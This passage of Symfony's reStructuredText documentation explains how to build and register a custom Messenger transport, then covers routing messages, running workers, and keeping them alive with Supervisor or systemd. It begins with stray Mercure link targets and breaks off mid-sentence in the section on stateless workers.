.. _`Mercure.rocks`: https://mercure.rocks
.. _`Symfony Docker`: https://github.com/dunglas/symfony-docker/
.. _`API Platform distribution`: https://api-platform.com/docs/distribution/
.. _`JSON Web Token`: https://tools.ietf.org/html/rfc7519
.. _`example JWT`: https://jwt.io/#debugger-io?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJtZXJjdXJlIjp7InB1Ymxpc2giOlsiKiJdfX0.iHLdpAEjX4BqCsHJEegxRmO-Y6sMxXwNATrQyRNt3GY
.. _`IRI`: https://tools.ietf.org/html/rfc3987
.. _`practical UI`: https://twitter.com/ChromeDevTools/status/562324683194785792
.. _`the dedicated API Platform documentation`: https://api-platform.com/docs/core/mercure/
.. _`the online debugger`: https://uri-template-tester.mercure.rocks
.. _`a feature to test applications using Mercure`: https://github.com/symfony/panther#creating-isolated-browsers-to-test-apps-using-mercure-or-websocket
.. _`Symfony UX Turbo`: https://github.com/symfony/ux-turbo
How to Create Your own Messenger Transport
==========================================

Once you have written your transport's sender and receiver, you can register your
transport factory to be able to use it via a DSN in the Symfony application.

Create your Transport Factory
-----------------------------

You need to give FrameworkBundle the opportunity to create your transport from a
DSN. You will need a transport factory::

    use Symfony\Component\Messenger\Transport\Receiver\ReceiverInterface;
    use Symfony\Component\Messenger\Transport\Sender\SenderInterface;
    use Symfony\Component\Messenger\Transport\Serialization\SerializerInterface;
    use Symfony\Component\Messenger\Transport\TransportFactoryInterface;
    use Symfony\Component\Messenger\Transport\TransportInterface;

    class YourTransportFactory implements TransportFactoryInterface
    {
        public function createTransport(string $dsn, array $options, SerializerInterface $serializer): TransportInterface
        {
            return new YourTransport(/* ... */);
        }

        public function supports(string $dsn, array $options): bool
        {
            return 0 === strpos($dsn, 'my-transport://');
        }
    }

The transport object needs to implement the
:class:`Symfony\\Component\\Messenger\\Transport\\TransportInterface`
(which combines the :class:`Symfony\\Component\\Messenger\\Transport\\Sender\\SenderInterface`
and :class:`Symfony\\Component\\Messenger\\Transport\\Receiver\\ReceiverInterface`).
Here is a simplified example of a database transport::

    use Symfony\Component\Messenger\Envelope;
    use Symfony\Component\Messenger\Stamp\TransportMessageIdStamp;
    use Symfony\Component\Messenger\Transport\Serialization\PhpSerializer;
    use Symfony\Component\Messenger\Transport\Serialization\SerializerInterface;
    use Symfony\Component\Messenger\Transport\TransportInterface;
    use Symfony\Component\Uid\Uuid;

    class YourTransport implements TransportInterface
    {
        private SerializerInterface $serializer;

        /**
         * @param FakeDatabase $db is used for demo purposes. It is not a real class.
         */
        public function __construct(
            private FakeDatabase $db,
            ?SerializerInterface $serializer = null,
        ) {
            $this->serializer = $serializer ?? new PhpSerializer();
        }

        public function get(): iterable
        {
            // Get a message from "my_queue"
            $row = $this->db->createQuery(
                    'SELECT *
                    FROM my_queue
                    WHERE (delivered_at IS NULL OR delivered_at < :redeliver_timeout)
                    AND handled = FALSE'
                )
                ->setParameter('redeliver_timeout', new DateTimeImmutable('-5 minutes'))
                ->getOneOrNullResult();

            if (null === $row) {
                return [];
            }

            $envelope = $this->serializer->decode([
                'body' => $row['envelope'],
            ]);

            return [$envelope->with(new TransportMessageIdStamp($row['id']))];
        }

        public function ack(Envelope $envelope): void
        {
            $stamp = $envelope->last(TransportMessageIdStamp::class);
            if (!$stamp instanceof TransportMessageIdStamp) {
                throw new \LogicException('No TransportMessageIdStamp found on the Envelope.');
            }

            // Mark the message as "handled"
            $this->db->createQuery('UPDATE my_queue SET handled = TRUE WHERE id = :id')
                ->setParameter('id', $stamp->getId())
                ->execute();
        }

        public function reject(Envelope $envelope): void
        {
            $stamp = $envelope->last(TransportMessageIdStamp::class);
            if (!$stamp instanceof TransportMessageIdStamp) {
                throw new \LogicException('No TransportMessageIdStamp found on the Envelope.');
            }

            // Delete the message from the "my_queue" table
            $this->db->createQuery('DELETE FROM my_queue WHERE id = :id')
                ->setParameter('id', $stamp->getId())
                ->execute();
        }

        public function send(Envelope $envelope): Envelope
        {
            $encodedMessage = $this->serializer->encode($envelope);
            $uuid = (string) Uuid::v4();
            // Add a message to the "my_queue" table
            $this->db->createQuery(
                    'INSERT INTO my_queue (id, envelope, delivered_at, handled)
                    VALUES (:id, :envelope, NULL, FALSE)'
                )
                ->setParameters([
                    'id' => $uuid,
                    'envelope' => $encodedMessage['body'],
                ])
                ->execute();

            return $envelope->with(new TransportMessageIdStamp($uuid));
        }
    }

The implementation above is not runnable code but illustrates how a
:class:`Symfony\\Component\\Messenger\\Transport\\TransportInterface` could
be implemented. For real implementations see :class:`Symfony\\Component\\Messenger\\Transport\\InMemory\\InMemoryTransport`
and :class:`Symfony\\Component\\Messenger\\Bridge\\Doctrine\\Transport\\DoctrineReceiver`.

Register your Factory
---------------------

Before using your factory, you must register it. If you're using the
:ref:`default services.yaml configuration <service-container-services-load-example>`,
this is already done for you, thanks to :ref:`autoconfiguration <services-autoconfigure>`.
Otherwise, add the following:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            Your\Transport\YourTransportFactory:
                tags: [messenger.transport_factory]

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="Your\Transport\YourTransportFactory">
                   <tag name="messenger.transport_factory"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        use Your\Transport\YourTransportFactory;

        $container->register(YourTransportFactory::class)
            ->setTags(['messenger.transport_factory']);

Use your Transport
------------------

Within the ``framework.messenger.transports.*`` configuration, create your
named transport using your own DSN:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/messenger.yaml
        framework:
            messenger:
                transports:
                    yours: 'my-transport://...'

    .. code-block:: xml

        <!-- config/packages/messenger.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:messenger>
                    <framework:transport name="yours" dsn="my-transport://..."/>
                </framework:messenger>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/messenger.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->messenger()
                ->transport('yours')
                    ->dsn('my-transport://...')
            ;
        };

In addition of being able to route your messages to the ``yours`` sender, this
will give you access to the following services:

#. ``messenger.sender.yours``: the sender;
#. ``messenger.receiver.yours``: the receiver.
Messenger: Sync & Queued Message Handling
=========================================

Messenger provides a message bus with the ability to send messages and then
handle them immediately in your application or send them through transports
(e.g. queues) to be handled later. To learn more deeply about it, read the
:doc:`Messenger component docs </components/messenger>`.

Installation
------------

In applications using :ref:`Symfony Flex <symfony-flex>`, run this command to
install messenger:

.. code-block:: terminal

    $ composer require symfony/messenger

Creating a Message & Handler
----------------------------

Messenger centers around two different classes that you'll create: (1) a message
class that holds data and (2) a handler(s) class that will be called when that
message is dispatched. The handler class will read the message class and perform
one or more tasks.

There are no specific requirements for a message class, except that it can be
serialized::

    // src/Message/SmsNotification.php
    namespace App\Message;

    class SmsNotification
    {
        public function __construct(
            private string $content,
        ) {
        }

        public function getContent(): string
        {
            return $this->content;
        }
    }

.. _messenger-handler:

A message handler is a PHP callable, the recommended way to create it is to
create a class that has the :class:`Symfony\\Component\\Messenger\\Attribute\\AsMessageHandler`
attribute and has an ``__invoke()`` method that's type-hinted with the
message class (or a message interface)::

    // src/MessageHandler/SmsNotificationHandler.php
    namespace App\MessageHandler;

    use App\Message\SmsNotification;
    use Symfony\Component\Messenger\Attribute\AsMessageHandler;

    #[AsMessageHandler]
    class SmsNotificationHandler
    {
        public function __invoke(SmsNotification $message)
        {
            // ... do some work - like sending an SMS message!
        }
    }

.. tip::

    You can also use the ``#[AsMessageHandler]`` attribute on individual class
    methods. You may use the attribute on as many methods in a single class as you
    like, allowing you to group the handling of multiple related types of messages.

Thanks to :ref:`autoconfiguration <services-autoconfigure>` and the ``SmsNotification``
type-hint, Symfony knows that this handler should be called when an ``SmsNotification``
message is dispatched. Most of the time, this is all you need to do. But you can
also :ref:`manually configure message handlers <messenger-handler-config>`. To
see all the configured handlers, run:

.. code-block:: terminal

    $ php bin/console debug:messenger

Dispatching the Message
-----------------------

You're ready! To dispatch the message (and call the handler), inject the
``messenger.default_bus`` service (via the ``MessageBusInterface``), like in a controller::

    // src/Controller/DefaultController.php
    namespace App\Controller;

    use App\Message\SmsNotification;
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Messenger\MessageBusInterface;

    class DefaultController extends AbstractController
    {
        public function index(MessageBusInterface $bus): Response
        {
            // will cause the SmsNotificationHandler to be called
            $bus->dispatch(new SmsNotification('Look! I created a message!'));

            // ...
        }
    }

Transports: Async/Queued Messages
---------------------------------

By default, messages are handled as soon as they are dispatched. If you want
to handle a message asynchronously, you can configure a transport. A transport
is capable of sending messages (e.g. to a queueing system) and then
:ref:`receiving them via a worker <messenger-worker>`. Messenger supports
:ref:`multiple transports <messenger-transports-config>`.

.. note::

    If you want to use a transport that's not supported, check out the
    `Enqueue's transport`_, which backs services like Kafka and Google
    Pub/Sub.

A transport is registered using a "DSN". Thanks to Messenger's Flex recipe, your
``.env`` file already has a few examples.

.. code-block:: env

    # MESSENGER_TRANSPORT_DSN=amqp://guest:guest@localhost:5672/%2f/messages
    # MESSENGER_TRANSPORT_DSN=doctrine://default
    # MESSENGER_TRANSPORT_DSN=redis://localhost:6379/messages

Uncomment whichever transport you want (or set it in ``.env.local``). See
:ref:`messenger-transports-config` for more details.

Next, in ``config/packages/messenger.yaml``, let's define a transport called ``async``
that uses this configuration:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/messenger.yaml
        framework:
            messenger:
                transports:
                    async: "%env(MESSENGER_TRANSPORT_DSN)%"

                    # or expanded to configure more options
                    #async:
                    #    dsn: "%env(MESSENGER_TRANSPORT_DSN)%"
                    #    options: []

    .. code-block:: xml

        <!-- config/packages/messenger.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:messenger>
                    <framework:transport name="async">%env(MESSENGER_TRANSPORT_DSN)%</framework:transport>

                    <!-- or expanded to configure more options -->
                    <framework:transport name="async"
                        dsn="%env(MESSENGER_TRANSPORT_DSN)%"
                    >
                        <option key="...">...</option>
                    </framework:transport>
                </framework:messenger>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/messenger.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->messenger()
                ->transport('async')
                    ->dsn(env('MESSENGER_TRANSPORT_DSN'))
            ;

            $framework->messenger()
                ->transport('async')
                    ->dsn(env('MESSENGER_TRANSPORT_DSN'))
                    ->options([])
            ;
        };

.. _messenger-routing:

Routing Messages to a Transport
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Now that you have a transport configured, instead of handling a message immediately,
you can configure them to be sent to a transport:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/messenger.yaml
        framework:
            messenger:
                transports:
                    async: "%env(MESSENGER_TRANSPORT_DSN)%"

                routing:
                    # async is whatever name you gave your transport above
                    'App\Message\SmsNotification': async

    .. code-block:: xml

        <!-- config/packages/messenger.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:messenger>
                    <framework:routing message-class="App\Message\SmsNotification">
                        <!-- async is whatever name you gave your transport above -->
                        <framework:sender service="async"/>
                    </framework:routing>
                </framework:messenger>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/messenger.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->messenger()
                // async is whatever name you gave your transport above
                ->routing('App\Message\SmsNotification')->senders(['async'])
            ;
        };

Thanks to this, the ``App\Message\SmsNotification`` will be sent to the ``async``
transport and its handler(s) will *not* be called immediately. Any messages not
matched under ``routing`` will still be handled immediately, i.e. synchronously.

.. note::

    You may use a partial PHP namespace like ``'App\Message\*'`` to match all
    the messages within the matching namespace. The only requirement is that the
    ``'*'`` wildcard has to be placed at the end of the namespace.

    You may use ``'*'`` as the message class. This will act as a default routing
    rule for any message not matched under ``routing``. This is useful to ensure
    no message is handled synchronously by default.

    The only drawback is that ``'*'`` will also apply to the emails sent with the
    Symfony Mailer (which uses ``SendEmailMessage`` when Messenger is available).
    This could cause issues if your emails are not serializable (e.g. if they include
    file attachments as PHP resources/streams).

You can also route classes by their parent class or interface. Or send messages
to multiple transports:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/messenger.yaml
        framework:
            messenger:
                routing:
                    # route all messages that extend this example base class or interface
                    'App\Message\AbstractAsyncMessage': async
                    'App\Message\AsyncMessageInterface': async

                    'My\Message\ToBeSentToTwoSenders': [async, audit]

    .. code-block:: xml

        <!-- config/packages/messenger.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:messenger>
                    <!-- route all messages that extend this example base class or interface -->
                    <framework:routing message-class="App\Message\AbstractAsyncMessage">
                        <framework:sender service="async"/>
                    </framework:routing>
                    <framework:routing message-class="App\Message\AsyncMessageInterface">
                        <framework:sender service="async"/>
                    </framework:routing>
                    <framework:routing message-class="My\Message\ToBeSentToTwoSenders">
                        <framework:sender service="async"/>
                        <framework:sender service="audit"/>
                    </framework:routing>
                </framework:messenger>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/messenger.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $messenger = $framework->messenger();
            // route all messages that extend this example base class or interface
            $messenger->routing('App\Message\AbstractAsyncMessage')->senders(['async']);
            $messenger->routing('App\Message\AsyncMessageInterface')->senders(['async']);
            $messenger->routing('My\Message\ToBeSentToTwoSenders')->senders(['async', 'audit']);
        };

.. note::

    If you configure routing for both a child and parent class, both rules
    are used. E.g. if you have an ``SmsNotification`` object that extends
    from ``Notification``, both the routing for ``Notification`` and
    ``SmsNotification`` will be used.

.. tip::

    You can define and override the transport that a message is using at
    runtime by using the
    :class:`Symfony\\Component\\Messenger\\Stamp\\TransportNamesStamp` on
    the envelope of the message. This stamp takes an array of transport
    name as its only argument. For more information about stamps, see
    `Envelopes & Stamps`_.

Doctrine Entities in Messages
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you need to pass a Doctrine entity in a message, it's better to pass the entity's
primary key (or whatever relevant information the handler actually needs, like ``email``,
etc.) instead of the object (otherwise you might see errors related to the Entity Manager)::

    // src/Message/NewUserWelcomeEmail.php
    namespace App\Message;

    class NewUserWelcomeEmail
    {
        public function __construct(
            private int $userId,
        ) {
        }

        public function getUserId(): int
        {
            return $this->userId;
        }
    }

Then, in your handler, you can query for a fresh object::

    // src/MessageHandler/NewUserWelcomeEmailHandler.php
    namespace App\MessageHandler;

    use App\Message\NewUserWelcomeEmail;
    use App\Repository\UserRepository;
    use Symfony\Component\Messenger\Attribute\AsMessageHandler;

    #[AsMessageHandler]
    class NewUserWelcomeEmailHandler
    {
        public function __construct(
            private UserRepository $userRepository,
        ) {
        }

        public function __invoke(NewUserWelcomeEmail $welcomeEmail): void
        {
            $user = $this->userRepository->find($welcomeEmail->getUserId());

            // ... send an email!
        }
    }

This guarantees the entity contains fresh data.

.. _messenger-handling-messages-synchronously:

Handling Messages Synchronously
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If a message doesn't :ref:`match any routing rules <messenger-routing>`, it won't
be sent to any transport and will be handled immediately. In some cases (like
when `binding handlers to different transports`_),
it's easier or more flexible to handle this explicitly: by creating a ``sync``
transport and "sending" messages there to be handled immediately:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/messenger.yaml
        framework:
            messenger:
                transports:
                    # ... other transports

                    sync: 'sync://'

                routing:
                    App\Message\SmsNotification: sync

    .. code-block:: xml

        <!-- config/packages/messenger.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:messenger>
                    <!-- ... other transports -->

                    <framework:transport name="sync" dsn="sync://"/>

                    <framework:routing message-class="App\Message\SmsNotification">
                        <framework:sender service="sync"/>
                    </framework:routing>
                </framework:messenger>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/messenger.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $messenger = $framework->messenger();

            // ... other transports

            $messenger->transport('sync')->dsn('sync://');
            $messenger->routing('App\Message\SmsNotification')->senders(['sync']);
        };

Creating your Own Transport
~~~~~~~~~~~~~~~~~~~~~~~~~~~

You can also create your own transport if you need to send or receive messages
from something that is not supported. See :doc:`/messenger/custom-transport`.

.. _messenger-worker:

Consuming Messages (Running the Worker)
---------------------------------------

Once your messages have been routed, in most cases, you'll need to "consume" them.
You can do this with the ``messenger:consume`` command:

.. code-block:: terminal

    $ php bin/console messenger:consume async

    # use -vv to see details about what's happening
    $ php bin/console messenger:consume async -vv

The first argument is the receiver's name (or service id if you routed to a
custom service). By default, the command will run forever: looking for new messages
on your transport and handling them. This command is called your "worker".

If you want to consume messages from all available receivers, you can use the
command with the ``--all`` option:

.. code-block:: terminal

    $ php bin/console messenger:consume --all

.. versionadded:: 7.1

    The ``--all`` option was introduced in Symfony 7.1.

.. tip::

    In a development environment and if you're using the Symfony CLI tool,
    you can configure workers to be automatically run along with the webserver.
    You can find more information in the
    :ref:`Symfony CLI Workers <symfony-server_configuring-workers>` documentation.

.. tip::

    To properly stop a worker, throw an instance of
    :class:`Symfony\\Component\\Messenger\\Exception\\StopWorkerException`.

Deploying to Production
~~~~~~~~~~~~~~~~~~~~~~~

On production, there are a few important things to think about:

**Use a Process Manager like Supervisor or systemd to keep your worker(s) running**
    You'll want one or more "workers" running at all times. To do that, use a
    process control system like :ref:`Supervisor <messenger-supervisor>`
    or :ref:`systemd <messenger-systemd>`.

**Don't Let Workers Run Forever**
    Some services (like Doctrine's ``EntityManager``) will consume more memory
    over time. So, instead of allowing your worker to run forever, use a flag
    like ``messenger:consume --limit=10`` to tell your worker to only handle 10
    messages before exiting (then the process manager will create a new process). There
    are also other options like ``--memory-limit=128M`` and ``--time-limit=3600``.

**Stopping Workers That Encounter Errors**
    If a worker dependency like your database server is down, or timeout is reached,
    you can try to add :ref:`reconnect logic <middleware-doctrine>`, or just quit
    the worker if it receives too many errors with the ``--failure-limit`` option of
    the ``messenger:consume`` command.

**Restart Workers on Deploy**
    Each time you deploy, you'll need to restart all your worker processes so
    that they see the newly deployed code. To do this, run ``messenger:stop-workers``
    on deployment. This will signal to each worker that it should finish the message
    it's currently handling and should shut down gracefully. Then, the process manager
    will create new worker processes. The command uses the :ref:`app <cache-configuration-with-frameworkbundle>`
    cache internally - so make sure this is configured to use an adapter you like.

**Use the Same Cache Between Deploys**
    If your deploy strategy involves the creation of new target directories, you
    should set a value for the :ref:`cache.prefix.seed <reference-cache-prefix-seed>`
    configuration option in order to use the same cache namespace between deployments.
    Otherwise, the ``cache.app`` pool will use the value of the ``kernel.project_dir``
    parameter as base for the namespace, which will lead to different namespaces
    each time a new deployment is made.

Prioritized Transports
~~~~~~~~~~~~~~~~~~~~~~

Sometimes certain types of messages should have a higher priority and be handled
before others. To make this possible, you can create multiple transports and route
different messages to them. For example:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/messenger.yaml
        framework:
            messenger:
                transports:
                    async_priority_high:
                        dsn: '%env(MESSENGER_TRANSPORT_DSN)%'
                        options:
                            # queue_name is specific to the doctrine transport
                            queue_name: high

                            # for AMQP send to a separate exchange then queue
                            #exchange:
                            #    name: high
                            #queues:
                            #    messages_high: ~
                            # for redis try "group"
                    async_priority_low:
                        dsn: '%env(MESSENGER_TRANSPORT_DSN)%'
                        options:
                            queue_name: low

                routing:
                    'App\Message\SmsNotification': async_priority_low
                    'App\Message\NewUserWelcomeEmail': async_priority_high

    .. code-block:: xml

        <!-- config/packages/messenger.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:messenger>
                    <framework:transport name="async_priority_high" dsn="%env(MESSENGER_TRANSPORT_DSN)%">
                        <framework:options>
                            <framework:queue>
                                <framework:name>Queue</framework:name>
                            </framework:queue>
                        </framework:options>
                    </framework:transport>
                    <framework:transport name="async_priority_low" dsn="%env(MESSENGER_TRANSPORT_DSN)%">
                        <option key="queue_name">low</option>
                    </framework:transport>

                    <framework:routing message-class="App\Message\SmsNotification">
                        <framework:sender service="async_priority_low"/>
                    </framework:routing>
                    <framework:routing message-class="App\Message\NewUserWelcomeEmail">
                        <framework:sender service="async_priority_high"/>
                    </framework:routing>
                </framework:messenger>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/messenger.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $messenger = $framework->messenger();

            $messenger->transport('async_priority_high')
                ->dsn(env('MESSENGER_TRANSPORT_DSN'))
                ->options(['queue_name' => 'high']);

            $messenger->transport('async_priority_low')
                ->dsn(env('MESSENGER_TRANSPORT_DSN'))
                ->options(['queue_name' => 'low']);

            $messenger->routing('App\Message\SmsNotification')->senders(['async_priority_low']);
            $messenger->routing('App\Message\NewUserWelcomeEmail')->senders(['async_priority_high']);
        };

You can then run individual workers for each transport or instruct one worker
to handle messages in a priority order:

.. code-block:: terminal

    $ php bin/console messenger:consume async_priority_high async_priority_low

The worker will always first look for messages waiting on ``async_priority_high``. If
there are none, *then* it will consume messages from ``async_priority_low``.

.. _messenger-limit-queues:

Limit Consuming to Specific Queues
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Some transports (notably AMQP) have the concept of exchanges and queues. A Symfony
transport is always bound to an exchange. By default, the worker consumes from all
queues attached to the exchange of the specified transport. However, there are use
cases to want a worker to only consume from specific queues.

You can limit the worker to only process messages from specific queue(s):

.. code-block:: terminal

    $ php bin/console messenger:consume my_transport --queues=fasttrack

    # you can pass the --queues option more than once to process multiple queues
    $ php bin/console messenger:consume my_transport --queues=fasttrack1 --queues=fasttrack2

.. note::

    To allow using the ``queues`` option, the receiver must implement the
    :class:`Symfony\\Component\\Messenger\\Transport\\Receiver\\QueueReceiverInterface`.

.. _messenger-message-count:

Checking the Number of Queued Messages Per Transport
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Run the ``messenger:stats`` command to know how many messages are in the "queues"
of some or all transports:

.. code-block:: terminal

    # displays the number of queued messages in all transports
    $ php bin/console messenger:stats

    # shows stats only for some transports
    $ php bin/console messenger:stats my_transport_name other_transport_name

.. note::

    In order for this command to work, the configured transport's receiver must implement
    :class:`Symfony\\Component\\Messenger\\Transport\\Receiver\\MessageCountAwareInterface`.

.. _messenger-supervisor:

Supervisor Configuration
~~~~~~~~~~~~~~~~~~~~~~~~

Supervisor is a great tool to guarantee that your worker process(es) is
*always* running (even if it closes due to failure, hitting a message limit
or thanks to ``messenger:stop-workers``). You can install it on Ubuntu, for
example, via:

.. code-block:: terminal

    $ sudo apt-get install supervisor

Supervisor configuration files typically live in a ``/etc/supervisor/conf.d``
directory. For example, you can create a new ``messenger-worker.conf`` file
there to make sure that 2 instances of ``messenger:consume`` are running at all
times:

.. code-block:: ini

    ;/etc/supervisor/conf.d/messenger-worker.conf
    [program:messenger-consume]
    command=php /path/to/your/app/bin/console messenger:consume async --time-limit=3600
    user=ubuntu
    numprocs=2
    startsecs=0
    autostart=true
    autorestart=true
    startretries=10
    process_name=%(program_name)s_%(process_num)02d

Change the ``async`` argument to use the name of your transport (or transports)
and ``user`` to the Unix user on your server.

.. caution::

    During a deployment, something might be unavailable (e.g. the
    database) causing the consumer to fail to start. In this situation,
    Supervisor will try ``startretries`` number of times to restart the
    command. Make sure to change this setting to avoid getting the command
    in a FATAL state, which will never restart again.

    Each restart, Supervisor increases the delay by 1 second. For instance, if
    the value is ``10``, it will wait 1 sec, 2 sec, 3 sec, etc. This gives the
    service a total of 55 seconds to become available again. Increase the
    ``startretries`` setting to cover the maximum expected downtime.

If you use the Redis Transport, note that each worker needs a unique consumer
name to avoid the same message being handled by multiple workers. One way to
achieve this is to set an environment variable in the Supervisor configuration
file, which you can then refer to in ``messenger.yaml``
(see the ref:`Redis section <messenger-redis-transport>` below):

.. code-block:: ini

    environment=MESSENGER_CONSUMER_NAME=%(program_name)s_%(process_num)02d

Next, tell Supervisor to read your config and start your workers:

.. code-block:: terminal

    $ sudo supervisorctl reread

    $ sudo supervisorctl update

    $ sudo supervisorctl start messenger-consume:*

    # If you deploy an update of your code, don't forget to restart your workers
    # to run the new code
    $ sudo supervisorctl restart messenger-consume:*

See the `Supervisor docs`_ for more details.

Graceful Shutdown
.................

If you install the `PCNTL`_ PHP extension in your project, workers will handle
the ``SIGTERM`` or ``SIGINT`` POSIX signals to finish processing their current
message before terminating.

However, you might prefer to use different POSIX signals for graceful shutdown.
You can override default ones by setting the ``framework.messenger.stop_worker_on_signals``
configuration option.

In some cases the ``SIGTERM`` signal is sent by Supervisor itself (e.g. stopping
a Docker container having Supervisor as its entrypoint). In these cases you
need to add a ``stopwaitsecs`` key to the program configuration (with a value
of the desired grace period in seconds) in order to perform a graceful shutdown:

.. code-block:: ini

    [program:x]
    stopwaitsecs=20

.. _messenger-systemd:

Systemd Configuration
~~~~~~~~~~~~~~~~~~~~~

While Supervisor is a great tool, it has the disadvantage that you need system
access to run it. Systemd has become the standard on most Linux distributions,
and has a good alternative called *user services*.

Systemd user service configuration files typically live in a ``~/.config/systemd/user``
directory. For example, you can create a new ``messenger-worker.service`` file. Or a
``messenger-worker@.service`` file if you want more instances running at the same time:

.. code-block:: ini

    [Unit]
    Description=Symfony messenger-consume %i

    [Service]
    ExecStart=php /path/to/your/app/bin/console messenger:consume async --time-limit=3600
    Restart=always
    RestartSec=30

    [Install]
    WantedBy=default.target

Now, tell systemd to enable and start one worker:

.. code-block:: terminal

    $ systemctl --user enable messenger-worker@1.service
    $ systemctl --user start messenger-worker@1.service

    # to enable and start 20 workers
    $ systemctl --user enable messenger-worker@{1..20}.service
    $ systemctl --user start messenger-worker@{1..20}.service

If you change your service config file, you need to reload the daemon:

.. code-block:: terminal

    $ systemctl --user daemon-reload

To restart all your consumers:

.. code-block:: terminal

    $ systemctl --user restart messenger-consume@*.service

The systemd user instance is only started after the first login of the
particular user. Consumer often need to start on system boot instead.
Enable lingering on the user to activate that behavior:

.. code-block:: terminal

    $ loginctl enable-linger <your-username>

Logs are managed by journald and can be worked with using the journalctl
command:

.. code-block:: terminal

    # follow logs of consumer nr 11
    $ journalctl -f --user-unit messenger-consume@11.service

    # follow logs of all consumers
    $ journalctl -f --user-unit messenger-consume@*

    # follow all logs from your user services
    $ journalctl -f _UID=$UID

See the `systemd docs`_ for more details.

.. note::

    You either need elevated privileges for the ``journalctl`` command, or add
    your user to the systemd-journal group:

    .. code-block:: terminal

        $ sudo usermod -a -G systemd-journal <your-username>

Stateless Worker
~~~~~~~~~~~~~~~~

PHP is designed to be stateless, there are no shared resources across different
requests. In HTTP context PHP cleans everything after sending the response, so
you can decide to not take care of services that may leak memory.

On the other hand, it's common for workers to process messages sequentially in
long-running CLI processes which don't finish after processing a single message.
Beware about service states to prevent information and/or memory leakage as
Symfony will inject the same instance of a service in all messages, preserving
the internal state of the services.

However, certain Symfony services, such as the Monolog
:ref:`fingers crossed handler <logging-handler-fingers_crossed>`, leak by design.
Symfony provides a **service reset** feature to solve this problem. When resetting
